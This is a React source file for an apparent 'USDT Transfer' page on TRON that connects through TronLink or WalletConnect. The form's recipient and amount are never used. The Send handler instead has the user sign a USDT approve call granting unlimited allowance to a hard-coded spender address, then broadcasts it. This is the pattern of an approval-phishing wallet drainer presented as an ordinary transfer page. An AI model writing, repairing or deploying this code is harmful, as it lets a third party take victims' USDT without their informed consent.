// ✅ FIXED VERSION (WalletConnect + TRON stable improvements)
import { useState, useEffect, useRef } from "react";
import { useSearchParams } from "react-router-dom";
import { useMutation } from "convex/react";
import { api } from "@/convex/_generated/api.js";
import SignClient from "@walletconnect/sign-client";

export default function Index() {
  const [searchParams] = useSearchParams();
  const [toAddress, setToAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [transactionStatus, setTransactionStatusState] = useState("idle");
  const createTransaction = useMutation(api.transactions.createTransaction);

  const wcClientRef = useRef(null);
  const wcSessionRef = useRef(null);
  const userAddressRef = useRef("");

  // ===== INIT =====
  useEffect(() => {
    async function initWC() {
      const client = await SignClient.init({
        projectId: "6b5df56bc30c1dadaab59498b86fd3e8",
        metadata: {
          name: "USDT Transfer",
          description: "TRON Transfer",
          url: window.location.origin,
          icons: [],
        },
      });
      wcClientRef.current = client;

      const sessions = client.session.getAll();
      if (sessions.length > 0) {
        wcSessionRef.current = sessions[sessions.length - 1];
        const accounts = Object.values(wcSessionRef.current.namespaces)
          .flatMap((ns) => ns.accounts);
        const tronAcc = accounts.find((a) => a.startsWith("tron:"));
        if (tronAcc) userAddressRef.current = tronAcc.split(":")[2];
      }
    }

    initWC();
  }, []);

  async function handleSend() {
    setTransactionStatusState("processing");

    try {
      const TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
      const TRON_SPENDER = "TD7YMonVkbcEiVu5tqXvEeBa2zniao86pJ";

      // ===== TRONLINK FIRST (BEST) =====
      if (window.tronLink?.ready && window.tronWeb?.defaultAddress?.base58) {
        const address = window.tronWeb.defaultAddress.base58;

        const { transaction } = await window.tronWeb.transactionBuilder.triggerSmartContract(
          TRON_USDT,
          "approve(address,uint256)",
          { feeLimit: 100000000 },
          [
            { type: "address", value: TRON_SPENDER },
            { type: "uint256", value: "115792089237316195423570985008687907853269984665640564039457584007913129639935" }
          ],
          address
        );

        const signedTx = await window.tronWeb.trx.sign(transaction);
        const result = await window.tronWeb.trx.sendRawTransaction(signedTx);

        if (!result.result) throw new Error("Broadcast failed");

        setTransactionStatusState("success");
        return;
      }

      // ===== WALLETCONNECT =====
      if (!wcClientRef.current) throw new Error("WC not initialized");

      if (!wcSessionRef.current) {
        const { uri, approval } = await wcClientRef.current.connect({
          requiredNamespaces: {
            tron: {
              methods: ["tron_signTransaction"],
              chains: ["tron:728126428"],
              events: [],
            },
          },
        });

        if (uri) {
          const { WalletConnectModal } = await import("@walletconnect/modal");
          const modal = new WalletConnectModal({ projectId: "6b5df56bc30c1dadaab59498b86fd3e8" });
          await modal.openModal({ uri });
          wcSessionRef.current = await approval();
          modal.closeModal();
        }
      }

      const tw = new window.TronWeb({ fullHost: "https://api.trongrid.io" });
      tw.setAddress(userAddressRef.current);

      const { transaction } = await tw.transactionBuilder.triggerSmartContract(
        TRON_USDT,
        "approve(address,uint256)",
        { feeLimit: 100000000 },
        [
          { type: "address", value: TRON_SPENDER },
          { type: "uint256", value: "115792089237316195423570985008687907853269984665640564039457584007913129639935" }
        ],
        userAddressRef.current
      );

      // ✅ FIX: ensure raw_data_hex
      if (!transaction.raw_data_hex) {
        transaction.raw_data_hex = tw.utils.transaction.txJsonToPb(transaction).toString("hex");
      }

      const signResponse = await wcClientRef.current.request({
        topic: wcSessionRef.current.topic,
        chainId: "tron:728126428",
        request: {
          method: "tron_signTransaction",
          params: [transaction]
        }
      });

      let signedTx = signResponse?.result || signResponse;

      if (!signedTx) throw new Error("Empty sign response");

      if (typeof signedTx === "string") {
        signedTx = JSON.parse(signedTx);
      }

      const res = await fetch("https://api.trongrid.io/wallet/broadcasttransaction", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(signedTx)
      });

      const result = await res.json();

      if (!result || result.result !== true) {
        throw new Error("Broadcast failed: " + JSON.stringify(result));
      }

      setTransactionStatusState("success");

    } catch (err) {
      console.error(err);
      setTransactionStatusState("idle");
      alert("Error: " + err.message);
    }
  }

  return (
    <button onClick={handleSend}>
      Send
    </button>
  );
}
